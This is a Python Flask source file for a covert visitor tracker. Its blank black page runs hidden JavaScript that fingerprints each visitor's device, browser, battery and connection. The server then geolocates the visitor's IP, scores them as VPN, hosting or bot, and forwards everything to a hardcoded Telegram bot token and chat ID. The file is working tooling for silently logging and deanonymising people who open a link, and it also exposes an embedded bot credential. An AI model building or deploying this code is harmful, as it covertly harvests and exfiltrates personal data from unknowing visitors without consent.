import os
from flask import Flask, request, jsonify, render_template_string
import requests, json
from datetime import datetime
from html import escape

app = Flask(__name__)

TOKEN = "8963029953:AAEwY4G0qSN75a_DTKXR7ifyFr3wECNEROY"
CHAT = "8786521087"

def send(msg):
    try:
        r = requests.post(
            'https://api.telegram.org/bot' + TOKEN + '/sendMessage',
            json={'chat_id': CHAT, 'text': msg, 'parse_mode': 'HTML'},
            timeout=10
        )
        return r.status_code == 200
    except:
        return False
      
HTML = '''<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>.</title></head>
<body style="background:#000;color:#666">
<script>
setTimeout(async function(){
  var bat = {};
  try {
    if(navigator.getBattery){
      var bb = await navigator.getBattery();
      bat = {level: Math.round(bb.level*100), charging: bb.charging};
    }
  } catch(e){}
  var c = navigator.connection || {};
  var d = {
    ua: navigator.userAgent,
    screen: screen.width + 'x' + screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    cores: navigator.hardwareConcurrency || 0,
    mem: navigator.deviceMemory || 0,
    battery: bat,
    conn: c.effectiveType || '',
    downlink: c.downlink || 0,
    platform: navigator.platform || ''
  };
  await fetch('/collect', {method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify(d)});
}, 1500);
</script></body></html>'''
@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/ping')
def ping():
    return 'ok'

@app.route('/collect', methods=['POST'])
def collect():
    d = request.get_json(force=True, silent=True) or {}
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or '?')
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    info = {}
    try:
        info = requests.get('http://ip-api.com/json/' + ip, timeout=5).json()
    except:
        pass
    score = 0
    reasons = []
    if info.get('proxy'):
        score += 30
        reasons.append('VPN +30')
    if info.get('hosting'):
        score += 40
        reasons.append('Hosting +40')
    ua = d.get('ua', '')
    if 'headless' in ua.lower() or 'bot' in ua.lower():
        score += 50
        reasons.append('Bot +50')
    if score >= 50:
        level = "خطير"
    elif score >= 30:
        level = "مشبوه"
    elif score >= 10:
        level = "يستحق"
    else:
        level = "عادي"
    bat = d.get('battery', {})
    msg = '<b>' + level + ' | ' + str(score) + '</b>\n'
    msg += 'IP: <code>' + escape(ip) + '</code>\n'
    msg += escape(info.get('country','?')) + ' - ' + escape(info.get('city','?')) + '\n'
    msg += escape(info.get('isp','?')) + '\n\n'
    msg += escape(d.get('platform','?')) + '\n'
    msg += escape(d.get('screen','?')) + '\n'
    msg += 'Battery: ' + str(bat.get('level','?')) + '%\n'
    msg += 'Conn: ' + escape(d.get('conn','?')) + ' / ' + str(d.get('downlink',0)) + 'Mb\n'
    msg += 'Lang: ' + escape(d.get('lang','?')) + ' | ' + escape(d.get('tz','?')) + '\n'
    msg += 'Cores: ' + str(d.get('cores',0)) + '\n'
    if reasons:
        msg += '\n' + '\n'.join('- ' + escape(x) for x in reasons)
    send(msg)
    return jsonify({'ok': True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
